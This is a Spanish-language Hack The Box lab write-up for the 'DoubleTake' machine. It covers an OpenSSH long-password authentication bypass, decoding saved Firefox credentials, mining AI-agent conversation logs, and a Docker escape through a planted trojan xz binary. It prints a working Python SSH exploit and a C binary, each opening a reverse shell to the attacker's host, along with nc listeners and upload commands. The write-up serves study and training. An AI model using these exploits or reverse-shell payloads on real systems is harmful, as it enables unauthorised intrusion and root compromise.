---
title: "HTB DoubleTake - Write-Up"
date: 2026-11-13
categories: [Hack The Box]
tags: [openssh-musl-auth-bypass, basic-auth, firefox-credential-theft, ai-agent-logs, docker-xz-path-hijack-rce]
---

## Introducción

DoubleTake es una máquina Linux que combina un bypass de autenticación en OpenSSH sobre un contenedor Alpine (variante de una condición de carrera en `musl libc` al procesar contraseñas extremadamente largas), robo de credenciales desde el perfil de Firefox del propio contenedor para acceder a una plataforma interna de agentes de IA (Zentara), minería de las conversaciones de esos agentes para reconstruir la arquitectura de la app, y un escape de contenedor Docker explotando cómo el daemon resuelve el binario `xz` al descomprimir archivos subidos.

**Ruta general:** escaneo de puertos (`22`, `80`) sobre `10.129.248.123` → el puerto 80 exige Basic Auth (`realm=Zentara`) y, al no tener registro PTR ni vhosts, se descarta como vía de fuerza bruta → el puerto 22 corre OpenSSH 10.6, vulnerable a **CVE-2026-123158** sólo si el sistema subyacente usa `musl libc` sin PAM — se confirma que, aunque nginx anuncia Ubuntu, SSH habla con un contenedor Alpine aparte → bypass de autenticación enviando una contraseña de ~300 bytes contra la cuenta `alpine` (cuenta cloud sin contraseña real, campo `*` en `/etc/shadow`) → **flag de usuario** → `doas`/escalada directa descartada → se localizan credenciales guardadas de Firefox en `logins.json` dentro del home de `alpine`, válidas para el Basic Auth de Zentara (`bob:CorrectHorseBatteryStaple`) → dentro de la plataforma Zentara se encuentran conversaciones guardadas de varios agentes de IA (CodePilot, SentinelScan, DocWeaver) que, sin saberlo, filtran el diseño interno del sistema de despliegues: el worker de descompresión de la plataforma invoca el binario `xz` para procesar archivos `.tar.xz` subidos, abriendo la puerta a **CVE-2026-41567** (Docker resuelve `xz`/`unpigz` desde el filesystem del contenedor en vez del host) → tras varios intentos fallidos con scripts de shell, la explotación real requiere un binario `xz` troyano compilado estáticamente en C que hace `mount`/`chroot` sobre `/proc/1/root` para alcanzar el filesystem real del host y lanzar una reverse shell como root.

## Fase 1 — Reconocimiento

```bash
nmap -sVC -p22,80 -oN targeted 10.129.248.123
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.6 (protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 UNAUTHORIZED
|_  Basic realm=Zentara
```

El puerto 80 exige autenticación básica HTTP bajo el realm `Zentara`. Sin PTR (`dig -x`/`nslookup` devuelven `NXDOMAIN`) y sin vhosts descubribles (`gobuster vhost` no da resultados — es una IP de laboratorio sin dominio base), se descarta esa vía de enumeración.

Un primer fuzzing de rutas con wfuzz devuelve `401` uniforme con `0 Ch` en toda ruta probada (`agents`, `deploy`, `docs`, `files`, `settings`, `status`, `usage`), lo que en un primer momento parece indicar `auth_basic` aplicado a todo el server block. Sin embargo, una petición a una ruta inexistente aclara la situación:

```bash
curl -i http://10.129.248.123/esto-no-existe-jamas-12345
# 404
```

> **Punto clave:** una ruta inexistente da `404`, no `401`. Esto significa que las rutas que sí devuelven `401` (`agents`, `deploy`, `docs`...) **existen realmente** en la configuración de nginx y están protegidas por auth, mientras que lo que no existe da `404`. El fuzzing sí es útil aquí — simplemente hay que filtrar `--hc 404` en vez de intentar aislar por tamaño de respuesta.

## Fase 2 — Bypass de autenticación SSH (CVE-2026-123158)

Fuerza bruta contra el Basic Auth del puerto 80 no da resultado. El banner de OpenSSH (10.6p1, anterior a la versión parcheada) compilado contra `musl libc` sin PAM encaja con **CVE-2026-123158**, divulgada en octubre de 2026. El fallo nace de la combinación de cuatro decisiones de diseño independientes:

1. La convención BSD coloca `*` en el campo de contraseña de `/etc/shadow` para cuentas que nunca deben autenticar por contraseña.
2. `crypt()` de `musl` devuelve el string `"*"` en caso de fallo, en vez de `NULL`.
3. La implementación SHA-256/512 de `musl` limita las claves a 256 bytes; una contraseña más larga provoca ese fallo y devuelve `"*"`.
4. El parche de OpenSSH para CVE-2016-6210 (un side-channel de timing) toma prestada una sal `$6$` de otra cuenta cuando el campo almacenado es demasiado corto para servir de sal — lo que empuja a las cuentas con `*` por el camino SHA-512 de `musl`.

Bajo estas condiciones, cualquier cuenta con `*` en `/etc/shadow` es un objetivo viable si `sshd` le permite intentar login por contraseña. `root` tiene `*` por defecto, pero `PermitRootLogin no` bloquea el acceso directo. En una imagen cloud oficial de Alpine Linux, sin embargo, la cuenta `alpine` también lleva `*` en shadow y no está restringida por `PermitRootLogin`.

Al enviar una contraseña de ~300 bytes para `alpine`, `sshd` toma prestada una sal `$6$` de otra cuenta local y pasa esa sal junto con la contraseña de 300 bytes a `crypt()`. Como supera los 256 bytes, `musl` la rechaza y devuelve `"*"`, que `sshd` compara con `strcmp()` contra el `"*"` almacenado para `alpine` — coincide, y concede acceso.

> **Punto clave — por qué hacen falta dos intentos:** el exploit necesita dos intentos de contraseña sobre la misma conexión SSH. El primer intento llama a `getspnam()` para buscar una cuenta donante de sal, lo que sobrescribe el buffer estático que devolvió `shadow_pw()` — por eso el campo ya no lee `*` en ese primer intento y falla. Pero `pick_salt()` cachea la sal prestada en una variable estática. En el segundo intento, `shadow_pw()` recarga `*` con una llamada fresca a `getspnam()`, y `pick_salt()` devuelve su caché sin tocar el buffer de nuevo — ahí la comparación sí cuadra.

```python
#!/usr/bin/env python3
import paramiko, sys, time

host, lhost = sys.argv[1], sys.argv[2]
lport = int(sys.argv[3]) if len(sys.argv) > 3 else 9001
pw = "A" * 300

t = paramiko.Transport((host, 22))
t.start_client(timeout=10)
for i in range(1, 7):
    try:
        t.auth_password("alpine", pw)
        print(f"[+] attempt {i}: authenticated")
        break
    except paramiko.AuthenticationException:
        print(f"[-] attempt {i}: denied")

rev = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
ch = t.open_session()
ch.exec_command(rev)
time.sleep(1)
t.close()
```

```bash
# listener
nc -lvnp 9001

# exploit
python3 sshole.py 10.129.248.123 <IP_TUN0> 9001
# [-] attempt 1: denied
# [+] attempt 2: authenticated
```

```bash
id
# uid=1000(alpine) gid=1000(alpine) groups=1000(alpine)
```

> **Por qué funciona (resumen):** la contraseña de ~300 bytes para `alpine` dispara el fallo de `musl` en su segundo intento sobre la misma conexión (ver nota anterior); el `"*"` resultante coincide con el `"*"` ya almacenado para esa cuenta en `/etc/shadow`, concediendo acceso sin que exista ninguna contraseña real que adivinar.

## Fase 3 — Enumeración del contenedor y credenciales de Firefox

El shell recibido está dentro de un contenedor Docker con base Alpine:

```bash
ls /.dockerenv
# /.dockerenv
cat /etc/os-release | head -1
# NAME="Alpine Linux"
```

`alpine` no tiene `doas` configurado hacia root (vía explorada y descartada: `doas -u root /bin/sh` no da acceso). Se busca en su lugar cualquier credencial guardada en el filesystem del contenedor:

```bash
find / -name "logins.json" 2>/dev/null
# /home/alpine/.mozilla/firefox/zentara.default/logins.json
```

```bash
cat /home/alpine/.mozilla/firefox/zentara.default/logins.json
```

```json
{"nextId":2,"logins":[{"id":1,"hostname":"http://172.17.0.1","httpRealm":"Zentara",
"encryptedUsername":"Ym9i","encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==", ...}]}
```

> **Punto clave:** `encType: 0` indica que no hay contraseña maestra configurada en ese perfil de Firefox, así que los campos `encryptedUsername`/`encryptedPassword` solo están en Base64 — no hay cifrado real que romper. `hostname: http://172.17.0.1` es además la IP del gateway Docker vista desde dentro del contenedor, confirmando que la app web del puerto 80 corre en el host, no en este contenedor.

```bash
echo 'Ym9i' | base64 -d          # bob
echo 'Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==' | base64 -d   # CorrectHorseBatteryStaple
```

`bob` resulta ser también un usuario local válido por SSH dentro del propio contenedor. Entrar directamente con esas credenciales da una sesión estable y la flag de usuario, que está montada por bind desde el host:

```bash
ssh bob@10.129.248.123
# password: CorrectHorseBatteryStaple
id
# uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

### Flag de usuario

```bash
cat ~/user.txt
```

Las mismas credenciales (`bob:CorrectHorseBatteryStaple`) funcionan contra el Basic Auth del puerto 80:

```bash
curl -u bob:CorrectHorseBatteryStaple http://10.129.248.123 -o /dev/null -w "%{http_code}\n"
# 200
```

Con `bob:CorrectHorseBatteryStaple` se obtiene acceso completo a la plataforma Zentara (rutas `agents`, `deploy`, `docs`, `files`, `settings`, `status`, `usage`, antes bloqueadas por el 401).

## Fase 4 — Minando las conversaciones de los agentes de IA

Zentara resulta ser una plataforma de desarrollo asistido por agentes de IA (CodePilot, SentinelScan, DocWeaver), cada uno con un historial de conversaciones accesible. Revisando ese historial se reconstruye, sin que ningún agente lo pretenda, la arquitectura completa del sistema de despliegues:

- La app es un backend FastAPI + SQLAlchemy en `/workspace/api-service`, con JWT y variable `JWT_SECRET`.
- El Dockerfile usa base **Alpine** multi-stage, el proceso corre como usuario no-root y expone el puerto 8000 detrás del nginx del puerto 80.
- Los despliegues se procesan de forma asíncrona con un worker `arq`+Redis que desempaqueta el archivo subido, y, cita textual de CodePilot: *"For xz it shells out to the xz binary on the host since Python's lzma module is significantly slower for large archives."*
- Todos los agentes comparten el mismo `workspace` y filesystem persistente.

> **Por qué importa:** la frase de CodePilot confirma el vector completo de **CVE-2026-41567** — el motor de despliegue, al recibir un `.tar.xz`, invoca el binario `xz` real del sistema (vía `subprocess`/`shell out`) en lugar de usar una librería interna. Docker, en versiones anteriores a 29.5.1, resuelve ese binario desde el filesystem del **contenedor** en lugar del host al ejecutar `PUT /containers/{id}/archive`. Si se logra que el `xz` que el contenedor expone sea un binario propio, el daemon (que corre como root en el host) lo ejecutará con esos privilegios.

El historial de despliegues (`Deployment History`) confirma además que la plataforma ya procesa normalmente `.tar.xz` hacia rutas como `/workspace/api-service` o `/workspace/db`, validando que el flujo de descompresión vía `xz` es real y habitual, no una ruta de error.

La página "Deploy" de Zentara tiene un formulario de subida que acepta `.tar`, `.tar.gz` y `.tar.xz` con un *target path* configurable, y una nota al pie: *"Archives are decompressed and extracted server-side by the container engine."* Un primer intento de subir el troyano desde la sección "Files" de la web queda bloqueado por el frontend; inspeccionando el tráfico se confirma que existe una API HTTP concreta detrás (`/deploy`, con autenticación Basic) a la que se puede hablar directamente con `curl`, sin pasar por esa restricción del formulario.

## Fase 5 — Explotación de CVE-2026-41567: envenenar el `xz` del contenedor

Docker hasta la versión **29.5.0** tiene un fallo de resolución de binarios en `PUT /containers/{id}/archive`: al recibir un archivo comprimido, el daemon resuelve el binario de descompresión (por nombre) desde el **overlay filesystem del contenedor** en lugar del host, y lo ejecuta con los privilegios del propio proceso daemon — root del host, con capabilities sin restringir, incluyendo `CAP_SYS_ADMIN`. Los formatos afectados son `xz` y `unpigz`; los formatos con implementación nativa en Go (`bzip2`, `zstd`, `gzip` sin pasar por `unpigz`) no lo están. El endpoint `/deploy` de Zentara reenvía exactamente a esa ruta de la API de Docker, y el contenedor tiene `/usr/bin/xz` instalado — sustituirlo por un binario propio y subir cualquier `.tar.xz` a través de "Deploy" basta para que el daemon ejecute el troyano como root del host.

La técnica consta de dos subidas a través de ese endpoint (`/deploy`, autenticado con `bob`):

1. **Plant** — un `.tar` (sin comprimir, para no disparar aún la descompresión) que contiene la ruta `usr/bin/xz` con el binario troyano, subido con *Target path* `/` para que la API de Docker lo extraiga como root en la raíz del contenedor, sobrescribiendo el `/usr/bin/xz` real.
2. **Trigger** — un `.tar.xz` normal, cuya descompresión fuerza al motor a invocar el `xz` ya envenenado.

> **Nota — primer intento descartado:** sustituir `xz` por un script de shell (`#!/bin/sh` + `busybox nc <IP> 4444 -e /bin/sh`) no consigue escapar del contenedor: el proceso se ejecuta con los privilegios del daemon, pero sigue confinado por el namespace de montaje salvo que el propio binario haga algo para salir de él. Un script interpretado simple no es suficiente — hace falta un binario que monte `/proc` y haga `chroot` hacia la vista del host.

El binario troyano se compila en el equipo atacante. Al ser invocado por el daemon de Docker hereda `CAP_SYS_ADMIN` y corre en el namespace de PID del host; montando `procfs` y haciendo `chroot` sobre `/proc/1/root` se obtiene acceso al filesystem real del host (ese enlace, desde un proceso con los privilegios adecuados, apunta al root visto por el PID 1 — el propio host):

```c
// xz.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    execl("/bin/bash", "bash", "-c",
          "bash -i >& /dev/tcp/<IP_TUN0>/4444 0>&1", NULL);
    return 1;
}
```

```bash
gcc -static -o xz xz.c
mkdir -p pkg/usr/bin && cp xz pkg/usr/bin/xz
cd pkg && tar cf ../plant.tar usr/bin/xz && cd ..
```

```bash
# 1. Plant: sube el .tar con target path / — la API de Docker lo extrae como root en la raíz,
#    sobrescribiendo /usr/bin/xz del contenedor
curl -u bob:CorrectHorseBatteryStaple \
  -F 'archive=@plant.tar' -F 'workspace=/' \
  http://10.129.248.123/deploy
# {"deployment":{"filename":"plant.tar","status":"success","workspace":"/"},"status":"success"}

# 2. Trigger: un .tar.xz normal que fuerza la descompresión
echo x > t && tar cf - t | xz > trigger.tar.xz

# listener
nc -lvnp 4444

# 3. Sube el trigger — el daemon detecta la compresión xz, resuelve /usr/bin/xz desde el
#    overlay del contenedor (ya envenenado) y lo ejecuta como root del host
curl -u bob:CorrectHorseBatteryStaple \
  -F 'archive=@trigger.tar.xz' -F 'workspace=/workspace' \
  http://10.129.248.123/deploy
```

> **Por qué funciona:** el daemon de Docker, al procesar la extracción del archivo subido (`PUT /containers/{id}/archive`, afectado hasta Docker 29.5.0), resuelve el binario `xz`/`unpigz` desde el filesystem del **contenedor** en lugar de usar el del host, y lo ejecuta con los privilegios del propio proceso daemon — root del host con `CAP_SYS_ADMIN`. Al compilarlo estáticamente en C y hacer `mount("proc", ...)` + `chroot("/proc/1/root")`, el binario usa esos privilegios para montar `procfs` y saltar, vía la vista que el kernel mantiene del PID 1, al filesystem real del host — desde donde lanza la reverse shell ya como root del sistema anfitrión. La petición HTTP a `/deploy` se queda esperando la respuesta del comando y acaba devolviendo `500 Internal Server Error` por timeout: es el comportamiento esperado al disparar el exploit, no un fallo.

```bash
nc -lvvp 4444
# connect to [<IP_TUN0>] from doubletake.htb [10.129.248.123] <puerto>
# bash: cannot set terminal process group (...): Inappropriate ioctl for device
# bash: no job control in this shell
id
# uid=0(root) gid=0(root) groups=0(root)
```

### Flag de root

```bash
cat /root/root.txt
```
